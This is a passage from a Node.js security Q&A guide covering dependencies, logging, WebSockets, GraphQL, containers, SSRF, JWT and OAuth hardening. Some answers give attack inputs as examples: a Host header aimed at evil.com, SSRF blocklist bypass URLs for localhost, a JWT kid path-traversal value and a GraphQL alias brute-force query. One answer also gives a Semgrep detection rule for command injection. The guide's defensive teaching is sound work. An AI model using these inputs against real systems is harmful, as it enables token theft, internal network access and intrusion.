First try updating the direct dependency that pulls it in. If no fixed version exists, force the safe version with `overrides` in `package.json` (npm), `pnpm.overrides` or Yarn `resolutions`, then run your tests.

```json
{
  "overrides": {
    "cross-spawn": "^7.0.5"
  }
}
```

Remove the override once the parent package updates.

## 246: What do you check before adding a new npm package?

- Is the name correct (no typo) and is it the real, popular package?
- Is it maintained: recent releases, open issues handled, more than one maintainer?
- How many dependencies does it pull in?
- Does it have install scripts?
- Does it have provenance and a linked source repo?
- Could a few lines of your own code or a Node.js built-in do the same job?

Tools like Socket.dev and the OpenSSF Scorecard help with these checks.

## 247: What is a minimum release age for dependencies and why use it?

It is a setting that refuses to install package versions newer than a certain age, for example 24 hours or a few days. Most malicious versions of hijacked packages are found and removed within hours, so waiting avoids pulling them in. pnpm has `minimumReleaseAge`; with npm you can approximate it with `--before`. Make an exception process for urgent security fixes.

## 248: Why should CI and production use the same lockfile and npm ci?

If CI uses `npm install` and production builds use another command, they can end up with different versions. A security review or test run then means nothing for what actually runs. Using `npm ci` from the committed lockfile everywhere makes the tested build and the deployed build the same.

## 249: How do you use the permission model to limit file access to specific folders?

```bash
node --permission \
  --allow-fs-read=/app \
  --allow-fs-write=/app/uploads \
  --allow-fs-write=/tmp \
  server.js
```

Paths can be folders (which include everything inside) or specific files, and the flag can be repeated. Without `--allow-child-process` and `--allow-worker`, spawning processes and worker threads is also blocked.

## 250: What does the Node.js permission model not protect against?

The docs describe it as a "seat belt": it stops trusted code from touching files or resources by mistake, but it does not promise safety against malicious code. Some limits:

- File descriptors and handles opened before the check are not covered.
- Native addons are blocked by default, but if you allow them they can bypass everything.
- Symlinks inside allowed folders can point outside them.
- Network access is only covered by the newer `--allow-net` option, which is still experimental.

Use it as one layer next to containers, a non-root user and OS-level controls.

## 251: Which security events should a Node.js app log?

- Logins, failed logins, logouts and MFA events.
- Password and email changes, password reset requests.
- Access denied (403) responses and validation failures in bulk.
- Admin actions and permission or role changes.
- API key creation and revocation.
- Rate limit hits and lockouts.

Log who (user ID, IP), what, when and the result, but not secrets or full request bodies.

## 252: What is a correlation ID and why is it useful for security?

It is a unique ID attached to each request and included in every log line for that request, and passed on to downstream services. When something goes wrong, you can follow one attack across many services. You can also show it to users in error responses, so support can find the logs without seeing the real error.

```js
import { randomUUID } from "node:crypto";

app.use((req, res, next) => {
  req.id = randomUUID();
  res.setHeader("X-Request-Id", req.id);
  next();
});
```

## 253: How do you write an Express error handler that does not leak details?

```js
app.use((err, req, res, next) => {
  const status = err.status ?? err.statusCode ?? 500;
  req.log?.error({ err, reqId: req.id }, "request failed");

  if (res.headersSent) return next(err);
  res.status(status).json({
    error:
      status >= 500
        ? "Internal server error"
        : err.expose
          ? err.message
          : "Bad request",
    requestId: req.id,
  });
});
```

Only messages you marked as safe (`expose`) reach the client. Database errors, stack traces and file paths stay in the logs.

## 254: Why are raw database errors dangerous to return to clients?

They often include table and column names, parts of the query, constraint names and sometimes the data that caused the error. That helps attackers map your schema and fine-tune injection payloads. Map known errors (like unique constraint violations) to clear, safe messages and send a generic 500 for the rest.

## 255: How do you make audit logs harder to tamper with?

- Send them off the host right away to a central system the app cannot delete from.
- Use write-once storage (for example S3 Object Lock) for long-term retention.
- Give the app write-only access to the log sink.
- For high-value logs, chain entries with hashes or sign them, so changes are visible.

## 256: What should trigger a security alert, not just a log line?

- Many failed logins across many accounts from one source (credential stuffing).
- Successful login right after many failures.
- A spike in 403s or validation errors.
- Admin role granted or MFA turned off.
- Access from unusual countries or for unusual amounts of data.
- New dependencies with known critical CVEs in production.

Alert on patterns, not single events, or the team will start ignoring alerts.

## 257: How do you stop error trackers like Sentry from collecting secrets?

Configure data scrubbing on the server side of the tracker and filter in the SDK before sending. In Sentry's Node SDK, keep `sendDefaultPii` off and use `beforeSend` to remove headers and fields.

```js
import * as Sentry from "@sentry/node";

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  sendDefaultPii: false,
  beforeSend(event) {
    if (event.request?.headers) {
      delete event.request.headers.authorization;
      delete event.request.headers.cookie;
    }
    return event;
  },
});
```

## 258: What HTTP parser limits does Node.js have and how do you change them?

- Max header size: 16 KB by default, changed with `--max-http-header-size` or the `maxHeaderSize` server option.
- Max number of headers: `server.maxHeadersCount` (2000 by default).
- Timeouts: `headersTimeout`, `requestTimeout`, `keepAliveTimeout`.
- Requests per keep-alive socket: `server.maxRequestsPerSocket`.

Keep the defaults strict unless you have a real need to raise them.

## 259: What is the insecureHTTPParser option and why should it stay off?

It makes Node's HTTP parser (llhttp) accept malformed requests that break the HTTP spec, such as invalid header characters or odd `Transfer-Encoding` values. Accepting those is exactly what request smuggling attacks need. It exists only for talking to broken legacy clients. You can enable it with `--insecure-http-parser` or per server, but you should avoid both.

## 260: What is a Host header attack?

Some apps build absolute URLs from the incoming `Host` header, for example in password reset emails. An attacker sends a reset request with `Host: evil.com`, and the victim gets a real reset email with a link to the attacker's site, leaking the token. Use a fixed, configured base URL for links, and have your proxy reject unknown hosts.

```js
const resetUrl = new URL(`/reset?token=${token}`, process.env.PUBLIC_BASE_URL);
```

## 261: Can an attacker inject headers through res.setHeader in Node.js?

Not directly. Node.js checks header names and values and throws `ERR_INVALID_CHAR` if a value contains CR or LF characters, which blocks classic CRLF header injection and response splitting. You still need to validate values you put in headers, such as redirect URLs and file names in `Content-Disposition`, for other reasons like open redirects.

## 262: How do you authenticate WebSocket connections with the ws library?

Handle the HTTP `upgrade` event yourself, check the session cookie or token there, and only then complete the upgrade.

```js
import { WebSocketServer } from "ws";

const wss = new WebSocketServer({ noServer: true, maxPayload: 64 * 1024 });

server.on("upgrade", async (req, socket, head) => {
  try {
    if (!ALLOWED_ORIGINS.has(req.headers.origin)) throw new Error("bad origin");
    const user = await authenticateFromCookie(req.headers.cookie);
    if (!user) throw new Error("unauthenticated");

    wss.handleUpgrade(req, socket, head, (ws) => {
      wss.emit("connection", ws, req, user);
    });
  } catch {
    socket.write("HTTP/1.1 401 Unauthorized\r\n\r\n");
    socket.destroy();
  }
});
```

## 263: What is cross-site WebSocket hijacking?

Browsers do not apply the same-origin policy or CORS to WebSocket connections, and they send cookies with the handshake. If your server accepts any origin and uses cookies for auth, a malicious site can open a WebSocket to your server as the logged-in victim and read and send messages. Always check the `Origin` header during the handshake.

## 264: Why should you lower the ws maxPayload setting?

The `ws` library accepts messages up to 100 MiB by default. A client could send huge messages and use up memory. Set `maxPayload` to what your app really needs, often a few KB to a few hundred KB. Connections that send bigger messages are closed.

## 265: How do you rate limit WebSocket messages?

HTTP rate limit middleware does not see individual messages, so count them per connection (and per user) yourself.

```js
wss.on("connection", (ws) => {
  let count = 0;
  const timer = setInterval(() => {
    count = 0;
  }, 1000);

  ws.on("message", (data) => {
    if (++count > 20) return ws.close(1008, "rate limit");
    handleMessage(ws, data);
  });
  ws.on("close", () => clearInterval(timer));
});
```

Also limit the number of open connections per user and close idle ones with ping/pong heartbeats.

## 266: How do you secure Socket.IO connections?

- Set `cors.origin` to an exact list; Socket.IO does not allow cross-origin connections unless configured.
- Use a connection middleware (`io.use`) to check auth from `socket.handshake.auth` or cookies.
- Validate every event payload.
- Check authorization when joining rooms, so users cannot join other users' rooms.
- Set `maxHttpBufferSize` to a small value (it defaults to 1 MB).

```js
io.use(async (socket, next) => {
  const user = await verifyToken(socket.handshake.auth.token);
  if (!user) return next(new Error("unauthorized"));
  socket.data.user = user;
  next();
});
```

## 267: What is a GraphQL depth attack and how do you stop it?

GraphQL lets clients nest fields, and circular relations (user → posts → author → posts...) allow very deep queries that cause huge amounts of database work. Limit query depth with a validation rule such as `graphql-depth-limit` or GraphQL Armor's `maxDepth`.

```js
import depthLimit from "graphql-depth-limit";

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(7)],
});
```

## 268: What is query cost analysis in GraphQL?

Depth alone is not enough, because a shallow query can still ask for `users(first: 10000) { orders(first: 10000) }`. Cost analysis gives each field a cost (higher for lists and expensive resolvers, multiplied by page size) and rejects queries above a budget before running them. Libraries like `graphql-query-complexity` and GraphQL Armor do this.

## 269: What are GraphQL alias and batching attacks?

Aliases let one query call the same field many times with different arguments: `a1: login(pass: "1") a2: login(pass: "2") ...`. Batching sends an array of operations in one HTTP request. Both let an attacker try thousands of passwords or codes in one request and bypass per-request rate limits. Limit the number of aliases and batched operations, and rate limit sensitive mutations by operation, not by HTTP request.

## 270: Where should authorization happen in a GraphQL API?

In the resolvers or, better, in the business logic layer they call, not only at the HTTP gateway. One request can reach many types and fields, so each resolver that returns sensitive data must check if the current user can see it. Putting the checks in shared services keeps REST and GraphQL rules the same.

## 271: What are persisted queries and how do they help security?

With persisted (or "trusted") queries, the client sends a hash or ID of a query that was registered at build time instead of the full query text. The server runs only queries on that list. Attackers cannot send arbitrary deep or costly queries, so it is a strong control for first-party clients. Public APIs used by third parties cannot use a strict list.

## 272: What does Apollo Server's csrfPrevention option do?

It is on by default in Apollo Server 4 and later. It blocks GraphQL requests that a browser could send cross-site without a preflight: such requests must have a non-simple `Content-Type` like `application/json` or a special header like `Apollo-Require-Preflight`. This stops CSRF attacks that use simple form posts or GET requests to run mutations.

## 273: How do you stop GraphQL errors from leaking internal details?

Mask unexpected errors and only pass through errors you created on purpose. In Apollo Server, use `formatError` and turn off stack traces in production (`includeStacktraceInErrorResponses: false`, which is the default when `NODE_ENV=production`).

```js
const server = new ApolloServer({
  schema,
  formatError: (formatted, error) =>
    formatted.extensions?.code === "INTERNAL_SERVER_ERROR"
      ? { message: "Internal server error" }
      : formatted,
});
```

## 274: What does a secure multi-stage Dockerfile for Node.js look like?

```dockerfile
FROM node:24-slim AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build && npm prune --omit=dev

FROM node:24-slim
ENV NODE_ENV=production
WORKDIR /app
COPY --from=build --chown=node:node /app/node_modules ./node_modules
COPY --from=build --chown=node:node /app/dist ./dist
USER node
EXPOSE 3000
CMD ["node", "dist/server.js"]
```

Build tools and dev dependencies stay in the first stage, and the app runs as the `node` user. Pin the base image by digest for repeatable builds.

## 275: What are distroless images and what is the trade-off?

Distroless images contain only the runtime and its libraries: no shell, no package manager, no common tools. That leaves very little for an attacker to use and very little to patch. The trade-off is harder debugging, since you cannot `exec` into a shell; you use ephemeral debug containers instead. Images like `gcr.io/distroless/nodejs24-debian12` run as non-root with the `:nonroot` tag.

## 276: How do you pass secrets into a Docker build without leaking them into image layers?

Do not use `ARG` or `ENV` for secrets, because they stay in the image history. Use BuildKit secret mounts, which are available only during that `RUN` step.

```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
```

```bash
docker build --secret id=npmrc,src=$HOME/.npmrc .
```

## 277: Why do you need a .dockerignore file?

Without it, `COPY . .` sends your whole folder into the build context and possibly the image: `.env` files, `.git` history, local `node_modules`, test data and keys. A `.dockerignore` keeps them out.

```
.git
.env*
node_modules
coverage
*.pem
```

## 278: How do you scan container images for vulnerabilities?

Use a scanner like Trivy, Grype or Docker Scout in CI. They list known CVEs in OS packages and in `node_modules` inside the image, and can fail the build above a severity level.

```bash
trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:latest
```

Scan regularly, not just at build time, because new CVEs are found in images already running.

## 279: What Kubernetes securityContext settings should a Node.js pod use?

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
```

Mount an `emptyDir` for any folder the app must write to, like `/tmp`. Add resource limits so one pod cannot starve the node.

## 280: Why should Node.js not be PID 1 in a container without care?

PID 1 has special signal rules on Linux: it does not get default handlers, so `SIGTERM` is ignored unless your code handles it, and it must reap zombie child processes. Either handle `SIGTERM` in your code for a graceful shutdown, or run with an init process like `tini` (`docker run --init`). Avoid `npm start` as the container command, because npm does not always forward signals correctly.

## 281: How do you write a simple Semgrep rule for a Node.js security pattern?

```yaml
rules:
  - id: no-exec-with-template
    languages: [javascript, typescript]
    severity: ERROR
    message: Do not pass built strings to child_process.exec; use execFile with args
    patterns:
      - pattern-either:
          - pattern: exec(`...${$X}...`, ...)
          - pattern: exec($A + $B, ...)
```

Run it with `semgrep --config rules.yml`. Semgrep also has ready-made Node.js and Express rule sets you can add with `--config p/nodejs`.

## 282: What does eslint-plugin-security catch?

It flags risky patterns such as `eval` with expressions, `child_process` calls with non-literal arguments, non-literal `fs` file names, non-literal `RegExp` constructors, unsafe regexes and object injection through bracket notation. It has many false positives, so treat it as a code review prompt rather than a gate.

```js
// eslint.config.js
import security from "eslint-plugin-security";
export default [security.configs.recommended];
```

## 283: How do you run CodeQL on a Node.js repo?

On GitHub, turn on code scanning with the default setup, or add the CodeQL workflow. It builds a database of your code and runs queries that follow data from sources (request params) to sinks (SQL, `exec`, file paths, HTML output). Results show up as alerts in pull requests. Because it tracks data flow, it finds issues spread across files better than simple pattern tools.

## 284: How do you add a DAST scan with ZAP to CI?

Start the app in CI, then run ZAP's baseline scan against it. The baseline scan spiders the app and runs passive checks (headers, cookies, info leaks) without attacking, so it is safe for every pipeline.

```bash
docker run --network host -t zaproxy/zap-stable zap-baseline.py -t http://localhost:3000
```

Run the full active scan on a staging environment on a schedule, not against production.

## 285: How can property-based testing help find security bugs?

Instead of a few hand-written examples, you describe properties that must always hold, and the library generates many inputs. For example, "the sanitizer output never contains `<script`" or "the path helper never returns a path outside the base folder." `fast-check` works with `node:test`, Jest and Vitest.

```js
import fc from "fast-check";
import { test } from "node:test";

test("safePath never escapes the base folder", () => {
  fc.assert(
    fc.property(fc.string(), (name) => {
      try {
        return safePath(name).startsWith(BASE);
      } catch {
        return true;
      }
    }),
  );
});
```

## 286: Why should authorization rules have their own automated tests?

Access control bugs are the top web risk, and they are easy to break silently during refactoring. Write tests that call each endpoint as different users (anonymous, owner, other user, admin) and assert the expected 200, 403 or 404. A table-driven test over all routes catches new endpoints that forgot their checks.

## 287: How do you check if your Node.js version has known vulnerabilities?

Run the `is-my-node-vulnerable` tool from the Node.js security team. It compares your running version to the list of known vulnerabilities in the runtime.

```bash
npx is-my-node-vulnerable
```

Image scanners and `endoflife.date` checks also flag old or end-of-life Node.js versions.

## 288: How do you stay informed about Node.js security releases?

- Subscribe to the `nodejs-sec` Google group, which gets security release announcements.
- Watch the "Vulnerabilities" posts on the nodejs.org blog, which announce upcoming releases about a week ahead with severity.
- Follow GitHub advisories for your dependencies (Dependabot alerts).

Then plan time to test and deploy on the release day.

## 289: How do you harden GitHub Actions workflows for a Node.js project?

- Set `permissions:` to the minimum, for example `contents: read`.
- Pin third-party actions to a full commit SHA, not a tag that can be moved.
- Use OIDC to get short-lived cloud credentials instead of storing long-lived keys.
- Do not echo secrets and avoid passing them to untrusted steps.
- Use `npm ci --ignore-scripts` where possible.

```yaml
permissions:
  contents: read
steps:
  - uses: actions/checkout@<full-commit-sha>
```

## 290: Why is pull_request_target dangerous?

Workflows triggered by `pull_request_target` run with the base repository's secrets and write permissions, even for pull requests from forks. If such a workflow checks out and runs the PR's code (like `npm install` or tests), an attacker's PR can steal secrets or push to your repo. Use `pull_request` for running untrusted code, and only use `pull_request_target` for safe tasks like labeling.

## 291: Which security-related changes came with Express 5?

- `path-to-regexp` was updated to 8.x, which drops the regex-like route syntax that caused ReDoS problems.
- The default query parser is now "simple", so nested objects are not created from query strings.
- Rejected promises in async handlers are passed to the error handler automatically, so errors are no longer silently lost.
- `req.query` is a read-only getter.
- Old deprecated methods were removed.

## 292: What security features does Fastify give you by default?

- JSON schema validation of body, query, params and headers with Ajv, and response serialization from schemas, which stops extra fields from leaking.
- A `bodyLimit` of 1 MB by default.
- Protection against prototype poisoning in its JSON parser (`onProtoPoisoning` and `onConstructorPoisoning` options, defaulting to error on `__proto__`).
- Plugins like `@fastify/helmet`, `@fastify/rate-limit`, `@fastify/cors` and `@fastify/csrf-protection`.

## 293: How does NestJS's ValidationPipe help with mass assignment?

With `whitelist: true`, it strips any property that is not declared on the DTO class with a validation decorator. With `forbidNonWhitelisted: true`, it rejects the request instead. `transform: true` converts plain objects into DTO instances with the right types.

```ts
app.useGlobalPipes(
  new ValidationPipe({
    whitelist: true,
    forbidNonWhitelisted: true,
    transform: true,
  }),
);
```

## 294: What is HTTP parameter pollution?

It happens when a parameter appears more than once, like `?role=user&role=admin`. Node and Express turn it into an array, but code expecting a string may behave oddly: it may crash, skip a check or pick a different value than a proxy or WAF did. Validate that each parameter has the expected type, and reject arrays where you expect a single value.

## 295: Why should a JSON API check the request Content-Type?

If your API accepts form-encoded or text bodies as well as JSON, an attacker can send a "simple" cross-site request (no CORS preflight) from a plain HTML form. Accepting only `application/json` on state-changing endpoints forces a preflight for cross-origin requests and helps against CSRF. `express.json()` already parses only matching content types; return 415 for others.

## 296: Why does Unicode normalization matter for security checks?

Different byte sequences can look the same or be treated as equal later. For example, `ﬁ` (one ligature character) normalizes to `fi`. If you check usernames for uniqueness or blocked words before normalizing, but store or compare after, attackers can create look-alike accounts or bypass filters. Normalize with `str.normalize('NFKC')` before validation and comparison, and be careful with case folding.

## 297: How do signed cookies work in Express?

`cookie-parser` with a secret adds an HMAC signature to cookies you set with `signed: true`. On later requests, valid signed cookies appear in `req.signedCookies`, and changed ones are dropped. Signing stops tampering but does not hide the value, so do not put secrets in it.

```js
import cookieParser from "cookie-parser";

app.use(cookieParser(process.env.COOKIE_SECRET));
res.cookie("prefs", "dark", { signed: true, httpOnly: true, secure: true });
console.log(req.signedCookies.prefs);
```

## 298: What is the OWASP ASVS and how is it different from the Top 10?

The Application Security Verification Standard is a detailed list of security requirements, grouped by area (auth, sessions, validation, crypto, and more) and by level (L1 to L3). The Top 10 is an awareness list of risk categories; ASVS is something you can actually test against. Teams use ASVS to write security requirements and test plans.

## 299: How do you handle security fixes for a dependency with no patch available?

- Check if the vulnerable code path is reachable in your app at all.
- Apply a workaround: input validation, a config change or turning off the feature.
- Use `overrides` to an unaffected version if one exists.
- Patch it locally with `patch-package` or pnpm's `patch` command as a temporary fix.
- Replace the package if it looks abandoned.

Write down the decision so it is reviewed again when a fix ships.

## 300: What is a security champion in a dev team?

A developer who takes extra interest in security and acts as the link between the team and the security group. They help with threat models, review risky changes, keep track of dependency alerts and share knowledge. It spreads security work across teams instead of making one central team the bottleneck.

# Advanced Questions (301-450)

## 301: What does the Node.js threat model say Node.js trusts?

The Node.js project's security policy lists what the runtime treats as trusted: the code it is asked to run (your app and all its dependencies), the operating system, and the configuration (flags, environment variables, files it is told to load). Issues that need an attacker to control one of these are usually not treated as Node.js vulnerabilities. Untrusted input is data arriving over the network or through APIs like `http`, and the runtime must handle that safely. This tells you where your own controls need to be.

## 302: How does HTTP request smuggling work?

A front-end proxy and the Node.js back end disagree on where one request ends and the next begins, usually because of conflicting `Content-Length` and `Transfer-Encoding` headers (CL.TE or TE.CL), or odd values like `Transfer-Encoding: chunked, identity`. The attacker hides a second request inside the body of the first. The back end processes it as a separate request, which can bypass the proxy's access rules or poison responses for other users.

## 303: How does Node.js defend against request smuggling, and what is left to you?

Node's parser, llhttp, is strict by default: it rejects requests with both `Content-Length` and `Transfer-Encoding`, rejects invalid header characters and malformed chunk sizes, and several smuggling CVEs have been fixed in security releases. What is left to you:

- Keep Node.js updated, since parser fixes come in security releases.
- Never turn on `insecureHTTPParser`.
- Make the proxy normalize or reject ambiguous requests too, and keep it updated.
- Prefer HTTP/2 or HTTP/1.1 without connection reuse between proxy and app if your proxy has known issues.

## 304: What was the HTTP/2 Rapid Reset attack and how did Node.js respond?

In 2023 (CVE-2023-44487), attackers opened HTTP/2 streams and immediately cancelled them with `RST_STREAM`, over and over. Each stream made the server start work, but the cancel did not count against concurrency limits, so a few connections could create huge load. Node.js shipped a security release that tracks rapid resets and closes abusive sessions. It is a good example of why you must apply runtime security releases quickly.

## 305: Which options limit resource use on a Node.js HTTP/2 server?

```js
import http2 from "node:http2";

const server = http2.createSecureServer({
  key,
  cert,
  maxSessionMemory: 10, // MB per session
  maxHeaderListPairs: 128,
  settings: {
    maxConcurrentStreams: 100,
    maxHeaderListSize: 16 * 1024,
  },
});
server.setTimeout(30_000);
```

Many teams terminate HTTP/2 at the proxy and talk HTTP/1.1 to Node.js, which moves most of this work to a component built for it.

## 306: How can prototype pollution lead to remote code execution in Node.js?

Pollution by itself only adds properties, but "gadgets" in Node.js or libraries read options that fall back to the prototype. For example, `child_process.spawn` reads `options.shell` and `options.env`. If an attacker pollutes `Object.prototype.shell` or sets `NODE_OPTIONS` through a polluted `env`, a later harmless-looking `spawn('node', [...])` can end up running attacker commands. Template engines with polluted options have had similar gadgets.

## 307: Has Node.js core done anything about prototype pollution gadgets?

Yes. Over several releases, Node.js core has hardened how it reads options internally, for example by copying options into null-prototype objects or reading only own properties, which closed some known gadgets. You cannot count on this everywhere: not every core API is covered, and most libraries do not do it at all. Preventing the pollution in the first place is still the main fix.

## 308: How do you detect prototype pollution at runtime?

- In tests, check after each test that `Object.prototype` has no new own properties.
- In production, you can freeze `Object.prototype` (so pollution throws in strict mode) and alert on those errors.
- Use `--disable-proto=throw` to get errors on `__proto__` access.

```js
const baseline = new Set(Object.getOwnPropertyNames(Object.prototype));
function assertNoPollution() {
  const extra = Object.getOwnPropertyNames(Object.prototype).filter(
    (k) => !baseline.has(k),
  );
  if (extra.length) throw new Error(`Prototype polluted: ${extra.join(", ")}`);
}
```

## 309: How would you fix a deep-merge function to be safe against pollution?

```js
function isPlainObject(v) {
  if (v === null || typeof v !== "object") return false;
  const proto = Object.getPrototypeOf(v);
  return proto === Object.prototype || proto === null;
}

export function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype")
      continue;
    const value = source[key];
    if (isPlainObject(value)) {
      if (!Object.hasOwn(target, key) || !isPlainObject(target[key])) {
        target[key] = Object.create(null);
      }
      safeMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

It walks only own keys, skips dangerous names, only checks own properties on the target and never writes into an inherited object.

## 310: How can you run a regex with a time limit in Node.js?

JavaScript cannot interrupt a running regex on the main thread. Options:

- Run it in a worker thread and terminate the worker on timeout.
- Use `vm.runInNewContext` with the `timeout` option, which can interrupt synchronous code (not a sandbox, but useful as a watchdog for trusted code).
- Use a linear-time engine (`re2` or V8's experimental engine) so a timeout is not needed.

```js
import vm from "node:vm";

function testWithTimeout(pattern, input, ms = 50) {
  return vm.runInNewContext(
    "re.test(input)",
    { re: pattern, input },
    { timeout: ms },
  );
}
```

The vm call throws `ERR_SCRIPT_EXECUTION_TIMEOUT` when it runs too long.

## 311: What is V8's experimental non-backtracking regex engine?

V8 has a linear-time regex engine that you turn on with `--enable-experimental-regexp-engine`. Regexes with the `l` flag (`/(a+)+$/l`) then always use it. There is also `--enable-experimental-regexp-engine-on-excessive-backtracks`, which falls back to it when backtracking goes over a limit. It supports a subset of syntax (no backreferences or lookarounds) and is still experimental, so test before relying on it.

## 312: What is hash flooding and is Node.js exposed to it?

Hash flooding sends many keys that all land in the same hash bucket, turning fast lookups into slow linear scans. In the past it affected JSON parsing and query string parsing in many languages. V8 uses a randomized hash seed for strings, which makes it hard to craft colliding keys. Still, limit the number of keys you accept (`parameterLimit` for urlencoded bodies, `maxHeadersCount` for headers).

## 313: How do memory limits interact between Node.js and containers?

V8 sizes its heap from available memory. Current Node.js versions read the cgroup memory limit, but the heap limit may still be too close to the container limit, leaving no room for buffers, native memory and the stack. The container then gets OOM-killed instead of Node.js throwing a clean error. Set `--max-old-space-size` (in MB) to about 70 to 80 percent of the container limit, and watch RSS, not just heap.

```bash
node --max-old-space-size=1536 server.js   # for a 2 GB container
```

## 314: What is DNS rebinding and why does it break simple SSRF checks?

The attacker controls a domain whose DNS server returns a public IP the first time and `127.0.0.1` the second time, with a very short TTL. Your code resolves the name, sees a public IP and allows it, then the HTTP client resolves it again and connects to localhost. To fix it, check the IP that the connection actually uses, not the result of a separate lookup.

## 315: How do you check the IP at connection time to stop SSRF with DNS rebinding?

Pass a custom `lookup` function to the HTTP agent. Node.js uses it for the real connection, so the IP you check is the IP you connect to.

```js
import http from "node:http";
import https from "node:https";
import dns from "node:dns";

function safeLookup(hostname, options, callback) {
  dns.lookup(hostname, { ...options, all: true }, (err, addresses) => {
    if (err) return callback(err);
    const bad = addresses.find((a) =>
      blocked.check(a.address, a.family === 6 ? "ipv6" : "ipv4"),
    );
    if (bad) return callback(new Error(`Blocked IP ${bad.address}`));
    if (options.all) return callback(null, addresses);
    callback(null, addresses[0].address, addresses[0].family);
  });
}

const agentOptions = { lookup: safeLookup };
export const httpAgent = new http.Agent(agentOptions);
export const httpsAgent = new https.Agent(agentOptions);
```

Packages such as `request-filtering-agent` implement this pattern for you. For `fetch` (undici), pass a `dispatcher` built with `new Agent({ connect: { lookup: safeLookup } })`.

## 316: Which URL tricks do attackers use to bypass SSRF blocklists?

- Other IP formats: `http://2130706433/`, `http://0x7f.1/`, `http://127.1/`.
- IPv6 forms: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`.
- Domains that resolve to private IPs, like wildcard DNS services.
- Credentials and confusing parts: `http://good.com@evil.com/`.
- Redirects from an allowed host.

The WHATWG `URL` parser in Node.js normalizes many IPv4 forms (`new URL('http://2130706433/').hostname` is `127.0.0.1`), which is another reason to check resolved IPs instead of matching strings. Also handle IPv4-mapped IPv6 addresses in your block list.

## 317: Why is timingSafeEqual on raw tokens still sometimes leaky, and how do you fix it?

`timingSafeEqual` throws on different lengths, so the usual length check returns early and can reveal the secret's length. Also, if you look up a token in the database by value, the index lookup itself may have timing differences. Fixes:

- Compare fixed-length digests: HMAC or hash both values, then compare.
- Look up tokens by a non-secret ID part, then compare the secret part in constant time.

```js
import { createHmac, timingSafeEqual } from "node:crypto";

const mac = (v) => createHmac("sha256", COMPARE_KEY).update(v).digest();
const equal = timingSafeEqual(mac(provided), mac(expected));
```

## 318: What are kid, jku and x5u header attacks on JWTs?

These header fields tell the verifier which key to use. If the server trusts them blindly:

- `kid` used in a file path or SQL query can be injected (`../../dev/null` gives an empty key).
- `jku` or `x5u` pointing to an attacker's URL makes the server fetch the attacker's public key and accept their tokens.

Look up `kid` only in your own key set, and never fetch keys from URLs inside the token. Libraries like `jose` with `createRemoteJWKSet(new URL(fixedUrl))` do this correctly.

## 319: How do you verify tokens from an identity provider with key rotation?

Use the provider's JWKS endpoint with caching. `jose` handles caching, `kid` matching and refetching on unknown keys with a cooldown.

```js
import { createRemoteJWKSet, jwtVerify } from "jose";

const JWKS = createRemoteJWKSet(
  new URL("https://auth.example.com/.well-known/jwks.json"),
);

export async function verifyAccessToken(token) {
  const { payload } = await jwtVerify(token, JWKS, {
    issuer: "https://auth.example.com/",
    audience: "orders-api",
    algorithms: ["RS256", "ES256"],
  });
  return payload;
}
```

The cooldown matters: without it, attackers could send tokens with random `kid` values and make you hammer the JWKS endpoint.

## 320: What is DPoP and what problem does it solve?

Demonstrating Proof of Possession (RFC 9449) binds an access token to a key pair held by the client. Each request carries a signed DPoP proof JWT with the HTTP method, URL and a timestamp, and the token contains a hash of the client's public key. A stolen bearer token alone is useless, because the thief cannot create proofs. It costs more complexity and replay tracking on the server.

## 321: How do you choose between server sessions and stateless JWTs for a Node.js app?

Server sessions (cookie + Redis) give instant logout, easy permission changes and small cookies, at the cost of a store lookup per request. Stateless JWTs avoid the lookup and work well between services, but revocation is hard and stale claims stay until expiry. A common split: sessions for first-party browser apps (often with a BFF), short-lived JWTs for service-to-service calls and third-party API clients.

## 322: Why must OAuth redirect URIs be matched exactly?

If the authorization server allows partial matches (prefixes, wildcards, any path on a domain), an attacker can register or find a URL on that domain that leaks the code, for example an open redirect or a page with third-party scripts. The code then goes to the attacker. Register full redirect URIs and compare them exactly, which OAuth 2.1 requires.

## 323: What is an OAuth mix-up attack and how is it prevented?

When a client supports several authorization servers, an attacker-controlled server can trick the client into sending a code from the honest server to the attacker's token endpoint. The fix is to check which server the response came from: use the `iss` parameter in the authorization response (RFC 9207) or a separate redirect URI per provider. Good client libraries like `openid-client` check `iss` when the server supports it.

## 324: What must the server store and check when implementing passkeys?

- Generate a random challenge per ceremony, store it server-side (in the session) and accept it only once.
- Check the origin and RP ID in the response match your site.
- Store the credential ID, public key, sign counter and transports per user.
- On login, verify the signature with the stored public key, check user presence and, for sensitive actions, user verification.
- Treat a sign counter that goes backwards as a possible cloned key (most synced passkeys report 0, so handle that case).

Libraries like `@simplewebauthn/server` do most of this checking for you.

## 325: What is step-up authentication?

It asks the user to prove their identity again, often with a stronger factor, before a sensitive action like changing the email, adding a payout account or viewing secrets, even though they are already logged in. Record the time of the last strong authentication in the session (OIDC uses `auth_time` and `acr` claims) and require it to be recent for those endpoints.

## 326: When would you use a policy engine like OPA or Cedar instead of code checks?

When many services need the same rules, rules change often, or auditors need to see them in one place. The app sends a request (user, action, resource, context) to the engine, which returns allow or deny based on policies written in Rego (OPA) or Cedar. The costs are an extra network hop or sidecar, a new policy language to learn and the need to feed the engine fresh data.

## 327: How do you enforce tenant isolation in a multi-tenant Node.js API?

- Derive the tenant from the authenticated identity, never from a header or body field the client can set freely.
- Scope every query by tenant, ideally in one data access layer, not by hand in each route.
- Use database-level guards such as Postgres row-level security as a backstop.
- Separate caches, file storage paths and search indexes by tenant too.
- Write tests that try cross-tenant access for every resource type.

## 328: How do you use Postgres row-level security safely with a Node.js connection pool?

RLS policies usually read a session variable like `app.tenant_id`. With a pool, a connection is reused across requests, so a variable set with plain `SET` can leak to the next user. Set it with `set_config(..., true)` (same as `SET LOCAL`) inside a transaction, so it resets when the transaction ends.

```js
const client = await pool.connect();
try {
  await client.query("BEGIN");
  await client.query("SELECT set_config('app.tenant_id', $1, true)", [
